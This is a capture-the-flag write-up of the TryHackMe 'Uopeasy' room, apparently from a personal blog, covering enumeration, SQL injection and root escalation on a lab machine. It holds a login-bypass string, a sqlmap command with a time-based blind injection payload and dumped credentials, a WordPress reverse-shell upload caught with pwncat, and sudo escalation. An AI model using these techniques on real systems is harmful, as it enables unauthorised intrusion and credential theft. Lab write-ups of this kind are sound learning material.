---
layout: post
title: Uopeasy writeup
date: 2020-08-10 04:00:00 +5:30
description: The Following Post is writeup of Uopeasy Room of tryhackme # Add post description (optional)
categories: [TryHackMe, Medium]
tags: [tryhackme, ctf, flask, haskell] # add tag
---

## Description:

The Following Post is writeup of Uopeasy room of tryhackme <https://tryhackme.com/room/uopeasy>

|Machine|Details
|:---|:--
|OS | linux
|Rating | Medium
|Creator | ben

## Summary:

  The machine have a webpage at port 80 upon dirbusting you will se a login page which has sqli.
  Using sqlmap dump the database and login in the other port 8080 which has wordpress running in it.
  Edit the php file and get a reverse shell. Apply the same password to get user and simply sudo -i for root.


## Walkthrough:

### Enumeration

Lets start with nmap scan
```terminal
└──╼ $nmap -sC -sV -p80,443,8080 10.10.123.17
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 02:37 EDT
Nmap scan report for 10.10.123.17
Host is up (0.29s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp  open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05
|_Not valid after:  2025-02-14T03:30:05
8080/tcp open  http     Apache httpd
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
```
We can see server at port 80

let's dirbust it
```terminal
┌─[✗]─[silver@parrot]─[~]
└──╼ $gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.30.179
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.30.179
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 00:56:40 Starting gobuster
===============================================================
/login.php (Status: 200)
===============================================================
2020/08/10 01:01:57 Finished
===============================================================
```

### Exploitation:

So we have login let's check for sqli.
![port 80](/assets/img/uopeasy/loginatport80.png)

Here we go sqli
The service running was mysql

simple login bypass will work now let's extract out database ' OR 1=1--
Let's bring sqlmap and dump database

```terminal
┌─[silver@parrot]─[~/Desktop/tryhackme/uoeasy]
└──╼ $sqlmap -u 'http://10.10.123.17/login.php' --dump login --forms
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.7#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:14:15 /2020-08-08/

[04:14:15] [INFO] testing connection to the target URL
[04:14:16] [INFO] searching for forms
[#1] form:
POST http://10.10.123.17/login.php
POST data: user=&password=&s=Submit
do you want to test this form? [Y/n/q]
> y
Edit POST data [default: user=&password=&s=Submit] (Warning: blank fields detected):
do you want to fill blank fields with random values? [Y/n] y
[04:14:24] [INFO] resuming back-end DBMS 'mysql'
[04:14:24] [INFO] using '/home/silver/.sqlmap/output/results-08082020_0414am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=rZBt' AND (SELECT 1441 FROM (SELECT(SLEEP(5)))SUuw) AND 'YkMI'='YkMI&password=&s=Submit
---
do you want to exploit this SQL injection? [Y/n] y
[04:14:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:14:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[04:14:26] [INFO] fetching current database
[04:14:26] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)      
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[04:14:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[04:14:57] [INFO] adjusting time delay to 2 seconds due to good response times
login
[04:15:40] [INFO] fetching tables for database: 'login'
[04:15:40] [INFO] fetching number of tables for database 'login'
[04:15:40] [INFO] retrieved: 2
[04:15:46] [INFO] retrieved: user_
[04:16:46] [ERROR] invalid character detected. retrying..
[04:16:46] [WARNING] increasing time delay to 3 seconds
name
[04:17:31] [INFO] retrieved: users
[04:17:57] [INFO] fetching columns for table 'users' in database 'login'
[04:17:57] [INFO] retrieved: 2
[04:18:06] [INFO] retrieved: user_name
[04:19:58] [INFO] retrieved: pa
[04:20:35] [ERROR] invalid character detected. retrying..
[04:20:35] [WARNING] increasing time delay to 4 seconds
sswor
[04:22:04] [ERROR] invalid character detected. retrying..
[04:22:04] [WARNING] increasing time delay to 5 seconds
[04:22:22] [ERROR] invalid character detected. retrying..
[04:22:22] [WARNING] increasing time delay to 6 seconds
d
[04:22:43] [INFO] fetching entries for table 'users' in database 'login'
[04:22:43] [INFO] fetching number of entries for table 'users' in database 'login'
[04:22:43] [INFO] retrieved: 2
[04:22:58] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
pas
[04:24:35] [ERROR] invalid character detected. retrying..
[04:24:35] [WARNING] increasing time delay to 7 seconds
sword
[04:26:44] [INFO] retrieved: candyshop
[04:30:33] [INFO] retrieved: PopRocks
[04:34:34] [INFO] retrieved: Sir
Database: login
Table: users
[2 entries]
+-----------+------------+
| user_name | password   |
+-----------+------------+
| candyshop | password   |
| Sir       | PopRocks   |
+-----------+------------+

[04:35:45] [INFO] table 'login.users' dumped to CSV file '/home/silver/.sqlmap/output/10.10.123.17/dump/login/users.csv'
[04:35:45] [INFO] fetching columns for table 'user_name' in database 'login'
[04:35:45] [INFO] retrieved: 1
[04:35:54] [INFO] retrieved: user_name
[04:39:38] [INFO] fetching entries for table 'user_name' in database 'login'
[04:39:38] [INFO] fetching number of entries for table 'user_name' in database 'login'
[04:39:38] [INFO] retrieved: 1
[04:39:47] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
candyshop
Database: login
Table: user_name
[1 entry]
+-----------+
| user_name |
+-----------+
| candyshop |
+-----------+

[04:43:48] [INFO] table 'login.user_name' dumped to CSV file '/home/silver/.sqlmap/output/10.10.123.17/dump/login/user_name.csv'
[04:43:48] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/silver/.sqlmap/output/results-08082020_0414am.csv'

So there is another database



[22:01:22] [INFO] retrieved: phpmyadmin
[22:03:57] [INFO] retrieved: users
[22:05:07] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080



Let's dump wordpress8080 and see

[23:43:26] [INFO] retrieved: admin
Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    |<redacted>
+----------+---------------------+

[23:44:10] [INFO] table 'wordpress8080.users' dumped to CSV file '/home/silver/.sqlmap/output/10.10.179.109/dump/wordpress8080/users.csv'
[23:44:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/silver/.sqlmap/output/results-08092020_1137pm.csv'

[*] ending @ 23:44:10 /2020-08-09/
```

This was not a single dump since i misscalculated many thing and pretty much stuck here.

After sometime i finally got it.
Now let's login into wordpress.
![Dashboard](/assets/img/uopeasy/dashboard.png)

Now to uploaded reverse shell into 404.php.
![Upload](/assets/img/uopeasy/reverseshellupload.png)
let bring up pwncat.

```terminal
┌─[silver@parrot]─[~/Desktop/tryhackme/uoeasy]
└──╼ $pwncat --listen --port 4444
[23:56:36] received connection from 10.10.179.109:57043                                                                 connect.py:149
[23:56:39] new host w/ hash 5dd8ea056be4cd05d790067fea4bfccf                                                             victim.py:328
[23:56:56] pwncat running in /bin/sh                                                                                     victim.py:362
initializing: complete ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0%
[23:57:03] pwncat is ready 🐈                                                                                            victim.py:758


\[\033[01;31m\](remote)\[\033[00m\] \[\033[01;33m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]$ bash
daemon@Freshly:/$ ls
bin  boot  dev  etc  home  initrd.img  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
daemon@Freshly:/$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@Freshly:/$


so here

(remote) daemon@Freshly:/opt/wordpress-4.1-0$ su user
Password:
user@Freshly:/opt/wordpress-4.1-0$ ls
apache2  changelog.txt  config        img       manager-linux.run  php             README.txt  sqlite     uninstall.dat
apps     common         ctlscript.sh  licenses  mysql              properties.ini  scripts     uninstall  use_wordpress
user@Freshly:/opt/wordpress-4.1-0$ cd
user@Freshly:~$ ls
bitnami-wordpress-4.1-0-linux-installer.run
user@Freshly:~$ sudo -l
[sudo] password for user:
Matching Defaults entries for user on Freshly:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on Freshly:
   (ALL : ALL) ALL
user@Freshly:~$ sudo -l
Matching Defaults entries for user on Freshly:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on Freshly:
   (ALL : ALL) ALL
user@Freshly:~$ sudo -i
root@Freshly:~#
```

Rooted :-)
